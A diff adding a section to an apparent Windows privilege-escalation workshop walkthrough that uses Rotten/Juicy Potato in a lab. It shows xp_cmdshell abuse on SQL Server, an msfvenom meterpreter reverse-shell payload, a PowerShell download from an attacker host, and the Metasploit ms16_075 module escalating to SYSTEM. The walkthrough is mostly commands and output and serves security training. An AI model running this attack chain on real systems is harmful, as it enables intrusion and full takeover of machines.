@@ -1021,3 +1021,157 @@ PS C:\Users\user\Downloads>
 Let's talk through some of the steps here:
 
 We setup a local spoofer for WPAD, then we trigger the vulnerability by asking Defender to check for updates. Because Defender is running as NT\SYSTEM we can get a hash to relay to our own SMB server. Once we relay this to our local SMB server we can then execute a command.
+
+### Let's Talk Rotten/Juicy Potato ###
+
+Sometimes you get access to a machine running as a service account. For the purposes of our exercise I installed Microsoft SQL Server 2012 on my Windows 7 machine. I have xp_cmdshell execution on the box, which means I can leverage that into a reverse shell.
+
+https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/
+https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/juicypotato
+
+Since I am running as a service account:
+````
+SQL> xp_cmdshell whoami
+output                                                                             
+
+--------------------------------------------------------------------------------   
+
+nt service\mssqlserver                                                             
+
+NULL                                                                               
+
+SQL> 
+
+````
+
+We know we can abuse tokens to get an SEImpersonate token that will allow us to impersonate and then become the NT\SYSTEM user.
+Because getting Rotten Potato/Juicy Potato binaries is painful, we are going to use Metasploit for this exploit.
+
+So let's generate our meterpreter payload: 
+````
+root@kali:~/LPEWorkshop# msfvenom -p windows/meterpreter/reverse_tcp LPORT=1337 LHOST=YOURIPHERE -f exe > meterpreter.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 341 bytes
+Final size of exe file: 73802 bytes
+````
+Now let's transfer that to our victim machine by getting a reverse shell.
+````
+SQL> xp_cmdshell "powershell.exe -exec bypass -enc REVSHELLHERE"
+````
+Then transferring the file:
+
+````
+PS C:\Windows\system32> IEX (New-Object System.Net.WebClient).DownloadFile("http://10.22.6.122/meterpreter.exe", "C:\Windows\Temp\meterpreter.exe")
+````
+
+Now let's run the file and get our meterpreter shell.
+````
+PS C:\Windows\Temp> ./meterpreter.exe
+
+
+msf5 exploit(multi/handler) > sessions -i 1
+[*] Starting interaction with 1...
+
+meterpreter > getuid
+Server username: NT Service\MSSQLSERVER
+meterpreter > 
+````
+
+Now let's check our privs and tokens:
+````
+meterpreter > getprivs
+
+Enabled Process Privileges
+==========================
+
+Name
+----
+SeAssignPrimaryTokenPrivilege
+SeChangeNotifyPrivilege
+SeIncreaseQuotaPrivilege
+
+meterpreter > use incognito
+Loading extension incognito...Success.
+meterpreter > list_tokens -u
+[-] Warning: Not currently running as SYSTEM, not all tokens will be available
+             Call rev2self if primary process token is SYSTEM
+
+Delegation Tokens Available
+========================================
+NT Service\MSSQLSERVER
+
+Impersonation Tokens Available
+========================================
+No tokens available
+
+meterpreter >
+````
+
+We don't have any tokens available.
+
+Let's take a look at the available potato exploits that we have:
+````
+
+msf5 exploit(multi/handler) > search potato
+
+Matching Modules
+================
+
+   #  Name                                             Disclosure Date  Rank    Check  Description
+   -  ----                                             ---------------  ----    -----  -----------
+   0  exploit/windows/local/ms16_075_reflection        2016-01-16       normal  Yes    Windows Net-NTLMv2 Reflection DCOM/RPC
+   1  exploit/windows/local/ms16_075_reflection_juicy  2016-01-16       great   Yes    Windows Net-NTLMv2 Reflection DCOM/RPC (Juicy)
+
+
+msf5 exploit(multi/handler) > 
+````
+So now we choose the exploit:
+
+````
+msf5 exploit(multi/handler) > use 1
+msf5 exploit(windows/local/ms16_075_reflection_juicy) > 
+msf5 exploit(windows/local/ms16_075_reflection_juicy) > show options
+
+Module options (exploit/windows/local/ms16_075_reflection_juicy):
+
+   Name     Current Setting                         Required  Description
+   ----     ---------------                         --------  -----------
+   CLSID    {4991d34b-80a1-4291-83b6-3328366b9097}  yes       Set CLSID value of the DCOM to trigger
+   SESSION                                          yes       The session to run this module on.
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf5 exploit(windows/local/ms16_075_reflection_juicy) > 
+````
+
+It assigned a default CLSID, which we can change if we need to: https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md
+
+Then we set our session and go:
+````
+msf5 exploit(windows/local/ms16_075_reflection_juicy) > set session 1
+session => 1
+msf5 exploit(windows/local/ms16_075_reflection_juicy) > run
+
+[*] Started reverse TCP handler on 10.22.6.122:4444 
+[*] Launching notepad to host the exploit...
+[+] Process 1080 launched.
+[*] Reflectively injecting the exploit DLL into 1080...
+[*] Injecting exploit into 1080...
+[*] Exploit injected. Injecting exploit configuration into 1080...
+[*] Configuration injected. Executing exploit...
+[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
+[*] Sending stage (180291 bytes) to 10.22.6.43
+[*] Meterpreter session 2 opened (10.22.6.122:4444 -> 10.22.6.43:50585) at 2020-01-09 14:10:13 -0700
+
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+meterpreter > 
+````
